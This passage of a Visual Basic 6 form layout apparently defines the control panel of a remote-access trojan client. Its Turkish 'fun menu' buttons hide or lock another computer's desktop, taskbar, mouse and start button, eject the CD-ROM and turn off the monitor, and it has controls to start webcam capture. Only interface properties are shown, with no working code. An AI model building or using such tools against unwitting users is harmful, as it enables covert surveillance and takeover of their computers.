            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":38CFA
            PICN            =   "Form1.frx":39014
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Monitör"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   7
         Left            =   2760
         TabIndex        =   149
         Top             =   4200
         Width           =   1335
         Begin Client.cmd btn 
            Height          =   495
            Index           =   78
            Left            =   120
            TabIndex        =   150
            ToolTipText     =   "monitörü kapat"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":396DE
            PICN            =   "Form1.frx":399F8
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   79
            Left            =   720
            TabIndex        =   151
            ToolTipText     =   "monitörü aç"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3A07A
            PICN            =   "Form1.frx":3A394
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "CD-Rom"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   6
         Left            =   2760
         TabIndex        =   146
         Top             =   2280
         Width           =   1335
         Begin Client.cmd btn 
            Height          =   495
            Index           =   76
            Left            =   120
            TabIndex        =   147
            ToolTipText     =   "Open CD-Rom"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3A896
            PICN            =   "Form1.frx":3ABB0
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   77
            Left            =   720
            TabIndex        =   148
            ToolTipText     =   "Close CD-Rom"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3B232
            PICN            =   "Form1.frx":3B54C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Saat"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   5
         Left            =   2760
         TabIndex        =   143
         Top             =   1320
         Width           =   1335
         Begin Client.cmd btn 
            Height          =   495
            Index           =   74
            Left            =   120
            TabIndex        =   144
            ToolTipText     =   "Hide System Clock"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3BA4E
            PICN            =   "Form1.frx":3BD68
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   75
            Left            =   720
            TabIndex        =   145
            ToolTipText     =   "Show System Clock"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3C432
            PICN            =   "Form1.frx":3C74C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Task Simgeleri"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   4
         Left            =   2760
         TabIndex        =   140
         Top             =   360
         Width           =   1335
         Begin Client.cmd btn 
            Height          =   495
            Index           =   72
            Left            =   120
            TabIndex        =   141
            ToolTipText     =   "task simgelerini gizle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3CE16
            PICN            =   "Form1.frx":3D130
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   73
            Left            =   720
            TabIndex        =   142
            ToolTipText     =   "task simgelerini göster"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3D7FA
            PICN            =   "Form1.frx":3DB14
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Fare"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   3
         Left            =   120
         TabIndex        =   135
         Top             =   3240
         Width           =   2535
         Begin Client.cmd btn 
            Height          =   495
            Index           =   68
            Left            =   120
            TabIndex        =   136
            ToolTipText     =   "fare imlecini gizle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3E1DE
            PICN            =   "Form1.frx":3E4F8
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   69
            Left            =   720
            TabIndex        =   137
            ToolTipText     =   "fare imlecini göster"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3EBC2
            PICN            =   "Form1.frx":3EEDC
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   70
            Left            =   1320
            TabIndex        =   138
            ToolTipText     =   "fareyi kilitle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3F5A6
            PICN            =   "Form1.frx":3F8C0
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   71
            Left            =   1920
            TabIndex        =   139
            ToolTipText     =   "fare kilidini kaldýr"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":3FF42
            PICN            =   "Form1.frx":4025C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Baþlat Butonu"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   2
         Left            =   120
         TabIndex        =   130
         Top             =   2280
         Width           =   2535
         Begin Client.cmd btn 
            Height          =   495
            Index           =   64
            Left            =   120
            TabIndex        =   131
            ToolTipText     =   "baþlat butonunu gizle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":40896
            PICN            =   "Form1.frx":40BB0
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   65
            Left            =   720
            TabIndex        =   132
            ToolTipText     =   "baþlat butonunu göster"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":4127A
            PICN            =   "Form1.frx":41594
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   66
            Left            =   1320
            TabIndex        =   133
            ToolTipText     =   "baþlat butonunu kilitle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":41C5E
            PICN            =   "Form1.frx":41F78
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   67
            Left            =   1920
            TabIndex        =   134
            ToolTipText     =   "baþlat butonunun kilidini kaldýr"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":425FA
            PICN            =   "Form1.frx":42914
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Taskbar"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   1
         Left            =   120
         TabIndex        =   125
         Top             =   1320
         Width           =   2535
         Begin Client.cmd btn 
            Height          =   495
            Index           =   60
            Left            =   120
            TabIndex        =   126
            ToolTipText     =   "taskbarý gizle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":42F4E
            PICN            =   "Form1.frx":43268
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   61
            Left            =   720
            TabIndex        =   127
            ToolTipText     =   "taskbarý göster"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":43932
            PICN            =   "Form1.frx":43C4C
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   62
            Left            =   1320
            TabIndex        =   128
            ToolTipText     =   "taskbarý kilitle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":44316
            PICN            =   "Form1.frx":44630
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   63
            Left            =   1920
            TabIndex        =   129
            ToolTipText     =   "taskbar kilidini kaldýr"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":44CB2
            PICN            =   "Form1.frx":44FCC
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   " Masaüstü "
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   0
         Left            =   120
         TabIndex        =   120
         Top             =   360
         Width           =   2535
         Begin Client.cmd btn 
            Height          =   495
            Index           =   56
            Left            =   120
            TabIndex        =   121
            ToolTipText     =   "masaüstünü gizle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":45606
            PICN            =   "Form1.frx":45920
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   57
            Left            =   720
            TabIndex        =   122
            ToolTipText     =   "masaüstünü göster"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":45FEA
            PICN            =   "Form1.frx":46304
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   58
            Left            =   1320
            TabIndex        =   123
            ToolTipText     =   "masaüstünü kilitle"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":469CE
            PICN            =   "Form1.frx":46CE8
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   59
            Left            =   1920
            TabIndex        =   124
            ToolTipText     =   "masaüstü kilidini kaldýr"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":4736A
            PICN            =   "Form1.frx":47684
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Eðlence Menüsü"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   19
         Left            =   0
         TabIndex        =   119
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   11
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   113
      Top             =   3600
      Width           =   6735
      Begin VB.TextBox webcamkalite 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   405
         Left            =   6120
         TabIndex        =   115
         Text            =   "70"
         Top             =   360
         Width           =   495
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   54
         Left            =   6120
         TabIndex        =   116
         ToolTipText     =   "WebCam den görüntü almayý baþlat"
         Top             =   840
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":47CBE
         PICN            =   "Form1.frx":47FD8
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   55
         Left            =   6120
         TabIndex        =   117
         ToolTipText     =   "WebCam den görüntü almayý durdur"
         Top             =   1440
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
